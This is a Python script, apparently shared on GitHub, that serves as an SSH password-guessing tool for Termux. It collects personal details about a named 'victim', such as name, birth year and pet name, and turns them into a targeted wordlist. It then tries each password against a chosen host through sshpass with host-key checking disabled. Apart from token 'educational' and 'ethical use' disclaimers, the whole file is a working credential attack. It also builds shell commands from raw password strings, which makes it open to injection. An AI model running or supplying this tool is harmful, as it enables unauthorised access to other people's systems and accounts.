"""
SSH Brute Force Tool for Termux (No Paramiko)
Author: p4cket-hunt3r (https://github.com/p4cket-hunt3r)
For Educational Purposes Only
"""

import os
import time
import random
import string

# Step 1: Check & Install sshpass
def install_sshpass():
    print("\n[+] Checking Termux dependencies...")
    if os.system("command -v sshpass > /dev/null") != 0:
        print("[+] Installing sshpass...")
        os.system("pkg install sshpass -y")
    if os.system("command -v ssh > /dev/null") != 0:
        print("[+] Installing openssh...")
        os.system("pkg install openssh -y")

# Step 2: Generate Target-Specific Wordlist
def generate_wordlist(filename):
    print("\n[+] Wordlist Generation - Custom for Victim Target")

    name = input("Victim Full Name: ").strip()
    birthyear = input("Birth Year: ").strip()
    nickname = input("Nickname: ").strip()
    petname = input("Pet Name: ").strip()
    fav_color = input("Favorite Color: ").strip()

    include_numbers = input("Include number patterns? (yes/no): ").strip().lower() == "yes"
    include_symbols = input("Include symbols? (yes/no): ").strip().lower() == "yes"
    include_strong = input("Add Google-style strong random passwords? (yes/no): ").strip().lower() == "yes"

    passwords = []

    # Info-based simple patterns
    passwords += [
        name + "123",
        nickname + "123",
        petname + "123",
        name + birthyear,
        petname + birthyear,
        fav_color + "123",
        name + "@" + birthyear,
    ]

    # Number patterns
    if include_numbers:
        patterns = ["123", "1234", "12345", "112233", "2020", "2021"]
        for base in [name, nickname, petname, fav_color]:
            for num in patterns:
                passwords.append(base + num)

    # Symbol patterns
    if include_symbols:
        symbols = ["!", "@", "#", "$"]
        for base in [name, nickname, petname]:
            for sym in symbols:
                passwords.append(base + sym)
                passwords.append(sym + base + "123")

    # Strong random passwords
    if include_strong:
        print("[+] Generating strong random passwords...")
        for _ in range(10):
            strong_pwd = ''.join(random.choices(string.ascii_letters + string.digits + "!@#$%^&*", k=12))
            passwords.append(strong_pwd)

    # Save to file
    with open(filename, "w") as f:
        for pwd in passwords:
            f.write(pwd + "\n")

    print(f"[+] Wordlist saved as '{filename}' with {len(passwords)} passwords.")

# Step 3: SSH Brute Force with sshpass
def ssh_bruteforce(ip, user, wordlist_file):
    print("\n[+] Starting SSH Brute Force Attack...")
    try:
        with open(wordlist_file, "r") as f:
            passwords = f.readlines()
    except:
        print("[-] Wordlist file not found!")
        return

    for pwd in passwords:
        pwd = pwd.strip()
        print(f"[*] Trying password: {pwd}")
        cmd = f"sshpass -p '{pwd}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 {user}@{ip} exit"
        result = os.system(cmd)
        if result == 0:
            print(f"\n[+] Success! Password Found: {pwd}")
            return
        time.sleep(0.5)

    print("\n[-] Brute Force Finished. Password Not Found.")

# Step 4: Program Entry
if __name__ == "__main__":
    print("\n==== SSH Brute Force Tool for Termux (By p4cket-hunt3r) ====")
    install_sshpass()

    wordlist = "victim_wordlist.txt"
    generate_wordlist(wordlist)

    target_ip = input("\nEnter Target SSH IP: ").strip()
    target_user = input("Enter Target SSH Username: ").strip()

    ssh_bruteforce(target_ip, target_user, wordlist)

    print("\n[!] Ethical Use Only. Test only on authorized targets.")